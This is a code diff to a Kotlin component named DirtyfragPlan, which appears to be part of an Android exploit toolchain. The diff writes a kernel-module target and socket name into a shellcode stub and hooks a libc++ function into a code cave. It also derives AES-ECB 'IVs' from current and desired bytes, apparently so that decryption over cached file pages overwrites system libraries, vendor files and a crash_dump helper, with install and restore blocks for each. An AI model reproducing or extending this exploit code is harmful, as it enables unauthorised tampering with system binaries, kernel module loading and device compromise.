@@ -16,11 +16,16 @@ import javax.crypto.spec.SecretKeySpec
  * the private repo: stub.S, 420 bytes).
  */
 object DirtyfragPlan {
+    internal const val BRIDGE_ASSET = "dirtyfrag_bridge.bin"
     private const val STUB_ASSET = "dirtyfrag_stub.bin"
     private const val STUB_NAME_OFFSET = 3
-    private const val STUB_CODE_OFFSET = 0x4c
-    private const val STUB_FIRST_INS_OFFSET = 0x19c
-    private const val STUB_RETURN_OFFSET = 0x1a0
+    /* The module-pipeline ko target (a vendor_file path the stub insmods); an
+     * empty first byte keeps the W1 pipelines on the plain shell path. */
+    private const val STUB_KO_OFFSET = 0x50
+    private const val KO_TARGET_MAX = 64
+    private const val STUB_CODE_OFFSET = 0xd0
+    private const val STUB_FIRST_INS_OFFSET = 0x2d4
+    private const val STUB_RETURN_OFFSET = 0x2d8
     private const val CAVE_PAGE_BYTES = 0x1000L
     private const val SENTRY_SYMBOL =
         "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"
@@ -137,6 +142,16 @@ object DirtyfragPlan {
         encapPort: Int,
         socketName: String,
         out: File,
+        /* Module pipeline: the vendor_file target the stub insmods. */
+        koTarget: String = "",
+        /* Module pipeline: the crash_dump bridge host and its helper blob; the
+         * entries install the helper (aux-install run) and restore it (main). */
+        auxHost: File? = null,
+        auxHelper: ByteArray? = null,
+        auxInstalled: Boolean = false,
+        vendorPath: String? = null,
+        vendorLen: Int = 0,
+        vendorEntries: List<Pair<Long, ByteArray>> = emptyList(),
     ): File {
         require(key.size == 32) { "AES-256 key must be 32 bytes" }
         require(socketName.length == 8) { "abstract socket name must be 8 bytes" }
@@ -148,6 +163,12 @@ object DirtyfragPlan {
             require(blob.size >= STUB_RETURN_OFFSET + 4) { "stub asset truncated" }
 
             System.arraycopy(socketName.toByteArray(Charsets.US_ASCII), 0, blob, STUB_NAME_OFFSET, 8)
+            for (i in 0 until KO_TARGET_MAX) blob[STUB_KO_OFFSET + i] = 0
+            if (koTarget.isNotEmpty()) {
+                val bytes = koTarget.toByteArray(Charsets.US_ASCII)
+                require(bytes.size < KO_TARGET_MAX) { "ko target too long" }
+                System.arraycopy(bytes, 0, blob, STUB_KO_OFFSET, bytes.size)
+            }
             putInt(blob, STUB_FIRST_INS_OFFSET, readInt(elf, hook))
             putInt(blob, STUB_RETURN_OFFSET, branch(cave + STUB_RETURN_OFFSET, hook + 4))
             val hookBranch = branch(hook, cave + STUB_CODE_OFFSET)
@@ -172,12 +193,51 @@ object DirtyfragPlan {
             putInt(hookDesired, (hook - hookBase).toInt(), hookBranch)
             patches += Block(hookBase, hookCurrent, hookDesired)
 
+            /* The bridge host's helper blocks: the helper blob over the file's
+             * current bytes (install), and the inverse (restore). */
+            val auxPatch = ArrayList<Block>()
+            val auxRestore = ArrayList<Block>()
+            if (auxHost != null && auxHelper != null) {
+                RandomAccessFile(auxHost, "r").use { host ->
+                    var base = 0L
+                    while (base < auxHelper.size) {
+                        val current = readBlock(host, base)
+                        val desired = current.copyOf()
+                        for (j in 0 until 16) {
+                            val index = base + j
+                            if (index < auxHelper.size) desired[j] = auxHelper[index.toInt()]
+                        }
+                        auxPatch += Block(base, current, desired)
+                        auxRestore += Block(base, desired, current)
+                        base += 16
+                    }
+                }
+            }
+
             out.bufferedWriter().use { writer ->
                 writer.appendLine("lib ${lib.absolutePath}")
                 writer.appendLine("sender $senderPort")
                 writer.appendLine("encap $encapPort")
                 writer.appendLine("spi ${Integer.toUnsignedString(spi)}")
                 writer.appendLine("socket $socketName")
+                if (auxHost != null) {
+                    writer.appendLine("alib ${auxHost.absolutePath}")
+                    writer.appendLine("bridge ${auxHost.absolutePath}")
+                    writer.appendLine("auxinstalled ${if (auxInstalled) 1 else 0}")
+                    for (block in auxPatch) {
+                        writer.appendLine("apatch ${block.base} ${hex(ivFor(key, block.current, block.desired))}")
+                    }
+                    for (block in auxRestore) {
+                        writer.appendLine("arestore ${block.base} ${hex(ivFor(key, block.desired, block.current))}")
+                    }
+                }
+                if (vendorPath != null && vendorLen > 0) {
+                    writer.appendLine("vlib $vendorPath")
+                    writer.appendLine("vlen $vendorLen")
+                    for ((offset, iv) in vendorEntries) {
+                        writer.appendLine("vpatch $offset ${hex(iv)}")
+                    }
+                }
                 for (block in patches) {
                     writer.appendLine("patch ${block.base} ${hex(ivFor(key, block.current, block.desired))}")
                 }
@@ -191,7 +251,7 @@ object DirtyfragPlan {
         return out
     }
 
-    private fun ivFor(key: ByteArray, current: ByteArray, desired: ByteArray): ByteArray {
+    internal fun ivFor(key: ByteArray, current: ByteArray, desired: ByteArray): ByteArray {
         val cipher = Cipher.getInstance("AES/ECB/NoPadding")
         cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"))
         val decrypted = cipher.doFinal(current)
